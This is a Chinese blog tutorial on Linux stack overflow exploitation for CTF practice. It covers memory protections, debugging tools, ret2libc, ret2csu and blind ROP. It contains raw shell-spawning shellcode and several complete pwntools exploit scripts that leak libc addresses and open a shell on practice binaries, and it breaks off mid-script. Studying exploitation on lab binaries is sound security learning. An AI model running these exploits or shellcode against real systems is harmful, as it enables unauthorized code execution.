---
layout: post
title: 栈溢出指南
category: system
date: 2023-8-21 21:02:28
---
一步一步学stackoverflow
<!-- more -->
[toc]

## checksec总结

- RELRO：当`RELRO`保护为`NO RELRO`的时候，`init.array、fini.array、got.plt`均可读可写；为`PARTIAL RELRO`的时候，`ini.array、fini.array`可读不可写，`got.plt`可读可写；为`FULL RELRO`时，`init.array、fini.array、got.plt`均可读不可写。

- Canary（Stack）：栈溢出保护。这是一种缓冲区溢出攻击的缓解手段。如果启用栈保护，那么函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候再次验证cookie信息是否合法，若不合法，则程序停止运行。因此，攻击者在覆盖返回地址的时候，容易将cookie地址同样覆盖掉，导致栈保护检查失败，shellcode无法执行。Linux中的cookie信息便称为canary。如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过

- NX（DEP）：No-execute。NX基本原理就是数据所在内存页标识为不可执行，当程序溢出转到shellcode时，程序尝试在数据页面上执行指令，此时操作系统便会抛出异常而不是执行恶意代码。如果这个保护开启，即`NX enabled`，就意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过

- PIE（ASLR）：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址。

  ASLR（address space layout randomization）有以下三种情况：

  0 - 关闭地址空间随机化。

  1 - 表示将mmap的基址，stack和vdso页面随机化。

  2 - 表示在1的基础上增加堆（heap）的随机化。

- FORTIFY：FORTIFY_SOURCE机制对格式化字符串有两个限制(1)包含%n的格式化字符串不能位于程序内存中的可写地址。(2)当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。
- RWX：若`Has RWX segments`，那么说明含有可读，可写，可执行段。

- `gcc`编译

来一个完整版不带保护32位的：

```bash
gcc -m32 -Og -fno-stack-protector -no-pie -z execstack -o level1 level1.c
# -m32 生成32位程序
# -Og 不开启编译器优化
# -fno-stack-protector 不开启canary
# -z execstack 栈可执行
# 对于ASLR,关闭方式是在ROOT权限下执行： echo 0 > /proc/sys/kernel/randomize_va_space
```

```
NX：-z execstack / -z noexecstack (关闭 / 开启)
Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)
PIE：-no-pie / -pie (关闭 / 开启)
RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)
```

## ASLR和PIE的关系

`PIE`机制是程序本身的安全机制，而`ASLR`是操作系统的安全机制。

`PIE`只决定主程序的加载地址是否随机化，而`ASLR`决定堆地址/栈地址/共享库地址是否随机化。列表如下：

| ASLR | PIE  | 主程序加载地址 | 堆地址 | 栈地址 | 共享库地址 |
| ---- | ---- | -------------- | ------ | ------ | ---------- |
| 开启 | 开启 | 随机           | 随机   | 随机   | 随机       |
| 开启 | 关闭 | 固定           | 随机   | 随机   | 随机       |
| 关闭 | 开启 | 固定           | 固定   | 固定   | 固定       |
| 关闭 | 关闭 | 固定           | 固定   | 固定   | 固定       |

若关闭了`ASLR`，那么堆地址/栈地址/共享库地址一定是固定的。

## 短shellcode

```
# 64位
b'\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'
b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
```

## 栈溢出-确定填充长度

这一部分主要是计算**我们所要操作的地址与我们所要覆盖的地址的距离**。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式

- 相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得
- 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。
- 直接地址索引，就相当于直接给定了地址。

一般来说，我们会有如下的覆盖需求

- **覆盖函数返回地址**，这时候就是直接看 EBP 即可。
- **覆盖栈上某个变量的内容**，这时候就需要更加精细的计算了。
- **覆盖 bss 段某个变量的内容**。
- 根据现实执行情况，覆盖特定的变量或地址的内容。

之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来**直接或者间接地控制程序执行流程**。

栈大概长这样：

![img](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202210242112065.jpeg)

需要注意的是，32 位和 64 位程序有以下简单的区别

- x86
  - **函数参数**在**函数返回地址**的上方
- x64
  - System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 **RDI, RSI, RDX, RCX, R8 和 R9 寄存器**中，如果还有更多的参数的话才会保存在栈上。

## pwntools使用

可以对本地程序或者远程程序使用`pwntools`来进行数据的传输，寻找等等操作。

要创建一个本地进程的`pwntools`对象，使用：

```python
sh = process('./bin',env={"LD_PRELOAD":"./libc-2.23.so"})
```

网络上的进程使用：

```python
sh = remote('node.buuoj.cn', 2342) # 填写URL和端口号
```

将地址以`bytes`方式传输，对于32位程序和64位程序有不同方式：

```python
payload = b'a' * 0x80 + p32(addr) # 32位
payload = b'a' * 0x80 + p64(addr) # 64位
```

传送数据：

```python
sh.send(payload)  # 传送数据
sh.sendline(payload) # 传送所有数据
```

接受数据：

```python
sh.recvline()  # 接受一行数据，这样可以用来读取指定输出
```

编写`shellcode`：

```python
shellcode = asm(shellcraft.sh()) # 32位
shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64') # 64位
```

找到对应节的地址，例如`.plt`：

```python
plt0 = elf.get_section_by_name('.plt').header.sh_addr
```

唤起交互式终端：

```python
sh.interactive()
```

设置目标机信息：

```python
context(log_level = 'debug', arch = 'i386', os='linux')
#  log_level设置为debug时，pwntools会将完整过程打印下来
#  arch可选amd64、i386
```

查看进程`pid`：

```python
pid = util.proc.pidof(sh)[0]
print(pid)
# gdb.attach(pid)
```

## 调试操作

使用`gdb`调试文件：

```bash
gdb filename
```

在某函数处下断点：

```gdb
b main
```

查看有哪些断点：

```gdb
info b
```

在某地址处下断点：

```gdb
b *0x080486AE
```

开始运行,若有断点，会停在断点处:

```gdb
r
```

![image-20221024134804259](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202210241348535.png)

深红色说明发生了变化。

在断点时，`vmmap`可以查看当前程序系统调用库，同时可以查看读写等权限。

```gdb
vmmap
```

![image-20221024134835252](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202210241348333.png)

源码层面单步运行：

```gdb
n
```

汇编层面单步运行：

```gdb
ni
```

程序继续运行，直到断点或者程序结束：

```gdb
c
```

查看某函数汇编代码：

```gdb
disassemble main
```

打开`gdb`时，附加到某个进程：

```gdb
attach [pid]
```

## ida操作

伪代码和汇编切换 `F5`

流程图转长代码 `space`

交叉引用 `x` 或 `ctrl+x`

跳转到指定地址`g`

转换成字符 `r`

转数字 `a`

转代码 `c`

转换成十进制/十六进制数 `h`

重命名 `n`

搜索字符串 `alt+t`

转换数据类型（db、dw等） `d`

## ret2system

若反汇编出得来的文件中既含有`system()`函数，也含有`/bin/sh`这个参数，那可以直接将返回的地址处的栈构造成这种方式：（此处我们压入栈里面的是`_system()`函数的地址，因此需要函数的返回地址）

|           &(/bin/sh)         |

|   ret add of _system  |

|            &(_system)      |

此外，需要注意的是，若我们返回到的地址是`call _system`这种使用`call`来调用某个函数的形式，是不需要在栈里面压入返回地址的，因为`call`这种调用方式会自动执行这个操作，执行完毕后会自动继续执行。如图：

|           &(/bin/sh)       |

|     &(call _system)     |

## ret2shellcode

个人感觉是必须有可读部分，且NX保护不能开。（开了还执行个der的shellcode

![image-20221025202358102](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202210252023455.png)

```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
sh.interactive()
```

## ret2syscall

思路大概是：使用`ROPgadget`寻找到含有修改寄存器并`ret`的寄存器操作。（要`ret`是因为需要执行多个这样的操作）。然后找到多个这样的操作来覆盖`return address`，通过这些修改寄存器的操作来进行`syscall`。

主要利用系统调用，系统调用这个操作主要由操作系统内核提供。

32位应用程序调用系统调用的过程：

- 系统调用编号置入EAX
- 函数参数存入其他通用寄存器
- 触发0x80中断(int 0x80)

注意，x86中系统调用的前五个参数分别为：

- ebx
- ecx
- edx
- esi
- edi

若还有更多参数，则需要单独使用一个寄存器存放指向所有参数在用户空间地址的指针。

例如，实现`execve("/bin/sh")`操作，在32位系统下有如下特征：

- 系统调用号即eax为0xb（0xb对应要执行的系统调用，此处即execve）
- 第一个参数，即ebx指向/bin/sh的地址。为sh的地址也可以。
- 第二个参数、第三个参数，即ecx和edx为0。

64位略有不同：

- 系统调用编号存入rax
- 参数1存入rdi，参数2存入rsi，参数3存入rdx
- `execve`的系统调用号为`59`
- 不再使用`int 80`来发起系统调用，而是`syscall`指令。

## ROPgadgets操作

找`pop ebx`操作：

```shell
ROPgadget --binary file --only 'pop|ret'|grep 'ebx'
```

获得字符串对应地址操作：

```shell
ROPgadget --binary file --string '/bin/sh'
```

找int0x80：

```shell
ROPgadget --binary file --only 'int'
```

## ret2libc

### plt、got、以及延迟绑定机制

首先写一下`plt`和`got`表，以及他们的延迟绑定机制。

复习一下C语言编译的四个阶段，预处理，编译，汇编，链接。

我们知道C语言程序一般会使用一些库函数，比如`printf()`这个库函数。而这个库函数的源码在哪里？在`libc`里面，因此C语言程序从文本文件编译成最后的可执行程序时，需要将库函数也处理好。我们以`printf()`函数为例子，写一下`plt`、`got`两个表的作用和延迟绑定机制。

在已经完成链接的代码中，调用`printf()`函数的大意是这样的：（只是示例，实际差不多）

```assembly
...
call print@plt
...
```

上面的意思就是调用哪个函数呢？调用`plt`表中的`print`函数。

而`plt`表中，对应`print@plt`的是这样一个部分：

```assembly
Disassembly of section .plt:

080482d0 <common@plt>:
 80482d0:	ff 35 04 a0 04 08    	pushl  0x804a004
 80482d6:	ff 25 08 a0 04 08    	jmp    *0x804a008
 80482dc:	00 00                	add    %al,(%eax)
	...

080482e0 <print@plt>:
 80482e0:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 80482e6:	68 00 00 00 00       	push   $0x0
 80482eb:	e9 e0 ff ff ff       	jmp    80482d0 <_init+0x28>

080482f0 <__libc_start_main@plt>:
 80482f0:	ff 25 10 a0 04 08    	jmp    *0x804a010
 80482f6:	68 08 00 00 00       	push   $0x8
 80482fb:	e9 d0 ff ff ff       	jmp    80482d0 <_init+0x28>
```

上面分别有三个表项，分别是`common`（真实情况下不叫这个名字，而是最近的函数名）、`print`和`main`在`plt`表中的样子。

仍然看`print`表项，有三步：

第一步地址`80482e0`处是`jmp`到某个地址。这个其实就是`jmp`到`got`表中去查看`print`的真实地址了。

然而，此时`got`表中也没有存储`print`的真实地址，而是存储的`80482e6`。诶，这不是`print@plt`的第二步吗？怎么又返回到`plt`表中去了呢？

因为`plt`表中的第二步和第三步其实是“寻找`print`在`libc`中的地址，并将其写到`got`表中去”的意思。将真正的地址放到`got`表中后，以后若再次访问`print`函数的`got`表，就可以直接获得`print`函数的`libc`的地址了，这也就是延迟绑定机制。

总结一下，对于一个没有访问过的函数而言，查表流程是这样的：

`plt`->`got`->`plt`->`公共plt`->寻找在`libc`中的地址并存储到`got`表。

若该函数已经被访问过，则流程简单如下：

`call xxx@plt`->`plt`->`got`

### ret2libc流程

为什么要`ret2libc`？因为有的情况下，程序里面不会给我们提供一些显式的字符串，也没有可以利用的`gadgets`。但我们的程序需要使用库函数，是要连接`libc`库里面的，我们便可以利用`libc`库中的其他函数，只是需要知道函数在`libc`中的地址。虽然这个地址肯定是会变的，但是函数与函数间的相对地址不会变；或者说即使程序有ASLR保护，也只针对地址中间位进行随机，最低12位不会发生变化。因此我们只需要获得某一个函数在`libc`中的地址，就可以通过相对地址来获得其他的函数。

通过延迟访问机制后，我们即可明白：若直接访问一个没有访问过的函数的`got`表，是没有办法得到这个函数在`libc`中的真实地址的。因此，我们只能泄露一个已经访问的函数在`got`表中的地址。

这里写一个`wiki`里面的`exp`：

```python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']

print "leak libc_start_main_got addr and return to main again"
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload)

print "get the related addr"
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print "get shell"
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

和另外一个，可以看一下区别：

```python
from pwn import *
from LibcSearcher import *

elf=ELF('ret2libc3')
p=process('./ret2libc3')
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
start_addr = elf.symbols['_start']

#gdb.attach(p)
payload1='A'*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)
p.sendlineafter("!?",payload1)
puts_addr=u32(p.recv(4))

libc=LibcSearcher('puts',puts_addr)
libcbase=puts_addr-libc.dump("puts")
system_addr=libcbase+libc.dump("system")
binsh_addr=libcbase+libc.dump("str_bin_sh")

payload2='A'*112+p32(system_addr)+p32(1234)+p32(binsh_addr)
p.sendlineafter("!?",payload2)

p.interactive()
```

首先两个`exp`基本都是这样一种思路：因为程序内部有`puts`函数，所以我们通过栈溢出来让该函数打印出某个已经使用过的函数在`libc`中的地址，从而通过相对地址来得到`system`函数，并设置返回地址为`main`函数或者`start`函数，来再次通过栈溢出到`system`函数来进行攻击。

然而，可以看到，两个`exp`在第二次栈溢出时填充的字符的长度是不相等的，相差8个字符长度。这里写下原因，因为第一个`exp`的第一次栈溢出是回到了`main`，第二个`exp`的第一次栈溢出是回到了`start`函数。

我们知道函数调用的顺序是：`start()`->`main()`->`其他函数()`

因此若回到`start()`函数，程序会再次调用`main()`函数，从而调用其他函数；

若回到`main()`函数，程序将直接调用其他函数。

两者相差一个`main()`函数的`return address `和`ebp`，因此刚好差8个字节。



此外，使用本地的`libc`：

```python
libc = ELF('./libc-2.19.so')
libcbase = write_libc - libc.symbols['write']
system_libc = libcbase + libc.symbols['system']
bin_sh_libc = libcbase + next(libc.search(b'/bin/sh'))
```



**也可以使用`libc`里面的`gadgets`。**

## ret2csu

我们知道32位程序可以通过栈传递参数，但64位程序是用寄存器传递参数的，因此在`ret2libc`的时候需要有特定的`gadgets`来给寄存器赋值。有的情况下是没有这样的`gadgets`的，因此需要我们另辟蹊径，获得这样的`gadgets`。

在64位程序下，大多数程序都会调用`libc`的函数，而有一个特殊的函数用于对`libc`进行初始化操作，即`__libc_csu_init`函数。不同版本的函数有区别，我这里随便找了个程序来打开这个函数：

```assembly
.text:00000000004006D0 ; void _libc_csu_init(void)
.text:00000000004006D0                 public __libc_csu_init
.text:00000000004006D0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:00000000004006D0 ; __unwind {
.text:00000000004006D0                 push    r15
.text:00000000004006D2                 push    r14
.text:00000000004006D4                 mov     r15d, edi
.text:00000000004006D7                 push    r13
.text:00000000004006D9                 push    r12
.text:00000000004006DB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004006E2                 push    rbp
.text:00000000004006E3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004006EA                 push    rbx
.text:00000000004006EB                 mov     r14, rsi
.text:00000000004006EE                 mov     r13, rdx
.text:00000000004006F1                 sub     rbp, r12
.text:00000000004006F4                 sub     rsp, 8
.text:00000000004006F8                 sar     rbp, 3
.text:00000000004006FC                 call    _init_proc
.text:0000000000400701                 test    rbp, rbp
.text:0000000000400704                 jz      short loc_400726
.text:0000000000400706                 xor     ebx, ebx
.text:0000000000400708                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400710
.text:0000000000400710 loc_400710:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400710                 mov     rdx, r13
.text:0000000000400713                 mov     rsi, r14
.text:0000000000400716                 mov     edi, r15d
.text:0000000000400719                 call    qword ptr [r12+rbx*8]
.text:000000000040071D                 add     rbx, 1
.text:0000000000400721                 cmp     rbx, rbp
.text:0000000000400724                 jnz     short loc_400710
.text:0000000000400726
.text:0000000000400726 loc_400726:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400726                 add     rsp, 8
.text:000000000040072A                 pop     rbx
.text:000000000040072B                 pop     rbp
.text:000000000040072C                 pop     r12
.text:000000000040072E                 pop     r13
.text:0000000000400730                 pop     r14
.text:0000000000400732                 pop     r15
.text:0000000000400734                 retn
.text:0000000000400734 ; } // starts at 4006D0
.text:0000000000400734 __libc_csu_init endp
```

可以有以下点可以利用：

- `0x40072a` - `0x400732`

此处可以对`rbx`、`rbp`、`r12`、`r13`、`r14`、`r15`进行赋值并`ret`。为方便下面描述，这里称为过程1。

- `0x400710` - `0x400719`

此处有两个操作

一是使用`r13->rdx`，`r14->rsi`，`r15d->rdi`。 （给`edi`赋值时，`rdi`高位自动置零）

二是通过`r12 + rbx*8`实现任意函数调用。

这里称为过程2。

- `0x40071d` - `0x400724`

首先这里是过程2的后面。当`rbp = rbx + 1`时，函数继续执行到过程1。这里称为过程3。



从上面看出，我们可以通过以下流程来进行：

我们通过溢出到过程1，对寄存器进行赋值。由于最后有`ret`，继续执行栈上的内容。

栈上构造过程2。相当于过程1中，按照顺序是给寄存器`rbx`、`rbp`、`r12`、`rdx`、`rsi`、`edi`赋值。

那么设置`rbp = 1`，`rbx = 0`，满足过程3的条件，因此过程2执行完成后，会再次执行过程1（再次执行过程1只是为了接下来的`ret`，所以中间的部分直接填充了）。

过程2中执行任意函数地址为`r12`。这个函数的参数同样是最开始过程1中所控制的。



因此，我们可以设置如下栈：

high address     |  函数第一个参数 |  （只有低三十二位）

​                            |  函数第二个参数 |

​                            |  函数第三个参数 |

​                            |  要执行的函数的地址  |

​                            |  1  |

low address       |  0  |



在找到栈溢出点时，先溢出到过程1，过程1的栈如上所示，再溢出到过程2，即可通过上述栈完成任意函数执行。



来个`wiki`的`exp`：

```python
from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level = 'debug'

level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = 'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil('Hello, World\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))
##gdb.attach(sh)

## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')

sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
```

### 改进

用此处的通用gadgets，输入的字节长度较长，有的情况下不允许有这样长的payload。因此：

- 改进1 提前控制`rbx`和`rbp`

可以看到`rbx`和`rbp`在里面唯一的作用就是用来满足继续执行的条件，因此`rbx=0`，`rbp=1`可以事先设置好

- 改进2 多次利用

顾名思义，将这里的通用`gadgets`分成多次使用（可以用分成的很直观的那两段）。但两次触发之间，要保证程序不会修改`r12-r15`寄存器，因为在两段之间需要用到。

其实长`payload`和多个`payload`还是要看程序的情况，只可以长`payload`但只能利用一次程序也不是不可能。



### 其他的可能可用的gadgets

```
_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini
// 这些函数也会默认被gcc编译，也可以尝试用其中的代码来执行。
```

以及：在`_libc_csu_init`里面其实可以有其他的利用方法。

我们看这一段：

```assembly
.text:000000000040072A                 pop     rbx
.text:000000000040072B                 pop     rbp
.text:000000000040072C                 pop     r12
.text:000000000040072E                 pop     r13
.text:0000000000400730                 pop     r14
.text:0000000000400732                 pop     r15
.text:0000000000400734                 retn
```

看似是这样，但是我们反编译一下：（`objdump -d`）（地址不一样，因为不是一个程序，下面用图里面的地址）

![image-20221210155950618](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202212101559071.png)

可以知道，其实`pop rbx`只是机器码（这个是机器码吗，不太懂，假如错了戳我一下）`5b`而已，同样的，`pop rbp`也就只是机器码`5d`，而像`pop r12`是两个数值，即`41 5c`。

我们着重看`pop r13`，机器码是`41 5d`，因为其中有一个关键的`5d`，我们知道`5d`其实就是`pop rbp`，而加上前面的`41`才组成了`pop r13`。我们看图里面的地址，`0x4006af`不就是`5d`嘛？所以，这里其实是可以拿到`pop rbp`的`gadgets`的。如图：

![image-20221210160528831](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202212101605911.png)

对应的，`pop r15`是`41 5f`，这里我们可以通过`0x4006b3`拿到`5f`，也就是`pop rdi`，组成了`pop rdi;ret`的`gadgets`。

总结一下，这里一共可以拿到的`gadgets`：

```assembly
; 从pop rbx开始偏移10个字节。
retn
-----------
; 从pop rbx开始偏移9个字节。
pop rdi
retn
-----------
; 从pop rbx开始偏移7个字节。
pop rsi
pop r15
retn
-----------
; 从pop rbx开始偏移5个字节。
pop rbp
pop r14
pop r15
retn
-----------
; 从pop rbx开始偏移3个字节。
pop rsp
pop r13
pop r14
pop r15
retn
```



## BROP

`Blind-ROP`，也就是盲打！其实是没有源程序的情况下的一种攻击思路。

大概步骤分为几步：

- 判断栈溢出的长度
- Stack Reading（泄露`canaries`，`ebp`，`return address`）
- Blind ROP: 找到合适的`gadgets`，并用来控制输出函数（`puts(),write()`）的参数。
- 使用输出函数找到更多的`gadgets`以便于编写`exp`。

### 判断栈溢出长度

最简单的一步，从1开始暴力枚举，直到发现程序崩溃。

这里提一嘴，假如发现使得程序溢出的字节数不是64位的倍数，考虑是不是读入了一个回车。

### Stack Reading

经典栈布局：

```
buffer|canary|saved fame pointer|saved returned address
low address->                            ->high address
```

枚举后可以找到`buffer`的长度，但明显不够：我们不知道`canary`的值，之后的`ebp`等其他值也不知道。

这里先说一下`canary`，其实上面也写了，这是一个`cookie`信息，是为了防止栈溢出的，简略的说就是这个值要是被修改了，就说明可能发生了栈溢出，程序将会`crash`。所以在攻击的时候是需要保持`canary`不变的。

然而，这些值也可以爆破。好好好

但当然不能直接嗯爆破，毕竟64位程序就有$2^{64}$种可能。这里用一下`paper`里面的图：

![image-20221210184219331](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202212101842329.png)

其实也就是按字节爆破，和直接爆破的区别就是，以64位程序为例子，按字节爆破只需要 $8*2^{8} = 2048$ 次，因为我们是能够判断前面的字节是否匹配成功的。32位只需要 $4*2^{8}=1024$ 次。

### Blind ROP

首先我们需要利用一些关键`gadgets`，这里我们称为`BROP gadgets`，也就是之前在`libc_csu_init`里面结尾处的`gadgets`。为什么？因为这里能有控制两个关键的传参的寄存器`rdi`和`rsi`的`gadgets`。（怎么取到`rdi`和`rsi`在`ret2csu`那一节）。

在`write()`函数中，第三个参数仅仅是用来控制输出的字符串的长度，**不为0即可**。而`pop rdx; ret`这种`gadgets`是很少的，而当执行`strcmp()`的时候，`rdx`会被设置为将要被比较的字符串的长度，因此可以找到`strcmp`函数即可控制`rdx`。

但我们又不知道地址，怎么找到`BROP gadgets`呢？先看下面：

#### stop gadgets && trap gadgets

重头戏，特地搞个小标题。

`stop gadgets`和`trap gadgets`是两种特殊的`gadgets`；我们先寻找到这两种`gadgets`，以此找到其他的`gadgets`。

先说`trap gadgets`，很容易理解，也就是**会让程序发生崩溃**的一段代码。

`stop gadgets`呢，就是让程序**不发生崩溃**，但是又做出一定响应的一段代码。**TODO**

再引入一个概念：`Probe`，也就是探针，就是我们**想要探测的代码地址**。若程序是64位程序，可以直接从`0x400000`尝试。假如不成功，可能程序开启了`PIE`或者是32位程序。

试想这样一种栈：

```
Buffer|return address(probe)|stop gadgets 或 trap gadgets
low address->                            ->high address
```

这样一来，程序会去执行`probe`处的一小段代码，若这段代码没有任何对栈的操作，我们知道它是会返回到我们设置的`stop gadgets`或`trap gadgets`的。

更详细的说，可以通过这种方式**找到一个不会对栈进行`pop`操作的`gadgets`**：

```
Buffer|probe|stop|trap(trap|trap|...)
low address->                            ->high address
```

这样一来，若`probe`处没有`pop`操作，它便会执行`stop gadgets`，不会崩溃；若有`pop`操作，执行的便是`trap gadgets`，程序将会崩溃。因此找到一个不会崩溃的地方便是一个没有`pop`操作的`gadgets`，例如`xor eax, eax;ret`或者是`ret`这种。

以此类推，这种栈可以找到有一个`pop`操作的`gadgets`：

```
Buffer|probe|trap|stop|trap(trap|trap...)
```

这个可以找到有6个`pop`操作的`gadgets`：

```
Buffer|probe|trap|trap|trap|trap|trap|trap|stop|trap(trap|trap...)
low address->                            ->high address
```

**而像`BROP gadgets`这样一下弹出6个寄存器的`gadgets`程序中并不常见。因此，如果我们发现了这种`gadgets`，那么有很大可能性这个`gadgets`就是`BROP gadgets`！**由此我们可以通过地址偏移得到`libc_csu_init`里面的所有`gadgets`。

补充说明，`probe`本身可能是`stop gadgets`。可以用以下栈排除（正常执行的话即是`stop gadgets`）：

```
Buffer|probe|trap|trap(|trap|trap...)
```

找到`BROP gadgets`后，要看看可能会是`add rsp, 8`开始的，是的话偏移8个字节。

#### 控制rdx

上面已经讲解了如何通过`stop gadgets`和`trap gadgets`来控制前两个参数。而我们知道`strcmp()`只有两个参数嘛，因此假如我们有了`strcmp`和前两个参数的地址，我们便可以控制`rdx`。此处要注意，`strcmp(param1, param2)`需要两个参数都是可读的地址才可以。在没有开启`PIE`时，64位程序的`0x400000`处有7个非零字节，我们可以使用。

因此，目前要实现`write(param1, param2, param3)`仅剩一步：获取`write()`的地址，也就是`write_plt()`的地址。（`strcmp()`一样，都在`plt`表里面）

#### 寻找PLT表

寻找`plt`表的目的是，找出其中的`write_plt`或者是`puts_plt`等便于我们使用。

来看看`plt`表：

![image-20221210211419513](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202212102114754.png)

我们知道`plt`表中的三行，第一行是去`got`表查看（假如`got`表还没有，就是跳到下一行），第二三行是查找地址的意思。字节数可以看到分别是六字节、五字节、五字节，加起来十六字节。

每一个`plt`表项是16字节。因此，假如发现了**一系列的**长度为16的没有使得程序崩溃的代码段，那么很有可能遇到了`plt`表。此外，还可以通过前后偏移6字节来判断出于`plt`表中间还是出于开头（可以看到前6个字节是第一行，也就是去找`got`，因此在开头的话偏移6个字节是不会崩溃的）。

只要找到了`plt`表，我们遍历`plt`表即可获得里面的函数地址。

找到`puts(param1)`是比较简单的，如下面的`payload`：

```python
payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
```

若`addr`处是`puts`函数，那么将会输出`0x400000`处的7个非零字节（`\x7fELF`）。

这里补充写一下，假**如`puts_plt`是`plt`表中的第一个函数，那么在`puts_plt`之前的地址开始调用，也可能会调用到`puts`**。怎么找到`puts_plt`的开头地址呢？

可以使用两个`payload`，一个是上面那个，另一个是：

```python
payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr+6)+p64(stop_gadget)
```

只要两个`payload`都会输出`\x7fELF`，那么说明肯定此时`addr`就是`put_plt`开头了。

而`write(file* fp, param2, param3)`的第一个参数是文件描述符，我们需要找到文件描述符的值。这个比较麻烦，`wiki`上面是这么说的：

![image-20221210212904866](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202212102129783.png)

到这里，我们已经可以控制输出函数，那么我们便可以输出`.text`段的其它内容或者是其它`gadgets`，并找到其他函数，以便于完成攻击。

另一个常用思路是，根据获取的`puts`等`plt`表函数获取`got`表的内容，然后依次以此泄露`libc`版本来使用其他函数。使用`puts_plt`将从`0x400000`开始的`1k`个字节全部保存到文件，然后使用`ida`反编译即可查看。这里写一下代码和效果：

```python
def leak(length, pop_rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh = remote('127.0.0.1', 10001)
    payload = length*b'a' + p64(pop_rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
    sh.recvuntil('password?\n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close()
        if b'WelCome' in data:
            data = data[:data.index(b"\nWelCome")]
        else:
            data = data
        if data == b"":
            data = b'\x00'
        return data
    except Exception:
        sh.close()
        info('failure in {}'.format(leak_addr))
        return None
    
if __name__ == '__main__':
    result = b""
    addr = 0x400000
    while addr < 0x401000:
        info("starting to deal {}".format(hex(addr)))
